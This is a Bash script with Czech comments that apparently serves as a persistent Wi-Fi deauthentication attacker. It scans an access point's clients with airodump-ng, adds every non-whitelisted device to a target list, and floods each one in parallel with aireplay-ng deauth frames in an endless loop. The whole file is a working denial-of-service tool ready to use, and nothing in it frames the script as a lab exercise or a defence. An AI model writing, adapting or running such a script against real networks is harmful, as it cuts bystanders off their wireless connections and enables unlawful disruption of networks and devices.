#!/bin/bash

# Konfigurace
INTERFACE="wlan_tplinkmon"
BSSID_AP="FF:FF:FF:FF:FF:FF"
CHANNEL=10
SLEEP_INTERVAL=2
RAMCU=10

# Whitelist
WHITELIST=("XX:XX:XX:XX:XX:XX")

# --- PAMĚŤ SKRIPTU ---
declare -A KNOWN_CLIENTS

trap "echo -e '\nUkončuji...'; pkill airodump-ng; pkill aireplay-ng; exit" SIGINT SIGTERM

echo "--- Deauth Monitor (Persistent Multi-threaded Mode) ---"
# Výpis whitelistu na začátku
echo "[i] Whitelist nastaven pro následující adresy:"
for W in "${WHITELIST[@]}"; do
    echo "    - ${W^^}"
done
echo "-------------------------------------------------------"

while true; do
    echo "[$(date +%H:%M:%S)] Start skenování nových cílů..."
    
    TEMP_PREFIX="/tmp/killy_scan"
    rm -f ${TEMP_PREFIX}*

    iw dev $INTERFACE set channel $CHANNEL

    airodump-ng --bssid $BSSID_AP --channel $CHANNEL -w $TEMP_PREFIX --output-format csv --write-interval 1 $INTERFACE > /dev/null 2>&1 &
    AIRO_PID=$!
    
    sleep 12
    
    kill -9 $AIRO_PID > /dev/null 2>&1
    wait $AIRO_PID 2>/dev/null

    if [[ -f "${TEMP_PREFIX}-01.csv" ]]; then
        CURRENT_FOUND=$(grep -E '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}' "${TEMP_PREFIX}-01.csv" | \
                        tr -d '\r' | tr -d ' ' | cut -d',' -f1 | \
                        grep -viE "($BSSID_AP|ff:ff:ff:ff:ff:ff|Station|BSSID)" | sort -u)

        for CLIENT in $CURRENT_FOUND; do
            CLIENT_UP="${CLIENT^^}"
            if [[ -z "${KNOWN_CLIENTS[$CLIENT_UP]}" ]]; then
                IS_WHITE=false
                for W in "${WHITELIST[@]}"; do
                    if [[ "${CLIENT_UP}" == "${W^^}" ]]; then IS_WHITE=true; break; fi
                done
                
                if [ "$IS_WHITE" = false ]; then
                    echo "[+] Nový cíl přidán do seznamu: $CLIENT_UP"
                    KNOWN_CLIENTS[$CLIENT_UP]=1
                fi
            fi
        done
    fi

    if [ ${#KNOWN_CLIENTS[@]} -eq 0 ]; then
        echo "[?] Seznam cílů je zatím prázdný."
    else
        echo "[*] Útočím na VŠECHNY známé cíle (${#KNOWN_CLIENTS[@]})..."
        
        for TARGET in "${!KNOWN_CLIENTS[@]}"; do
            (
                aireplay-ng --deauth $RAMCU -a $BSSID_AP -c $TARGET $INTERFACE > /dev/null 2>&1
            ) &
        done
        
        wait
        echo "[*] Hromadný deauth dokončen."
    fi

    echo "[*] Čekám $SLEEP_INTERVAL s..."
    sleep $SLEEP_INTERVAL
done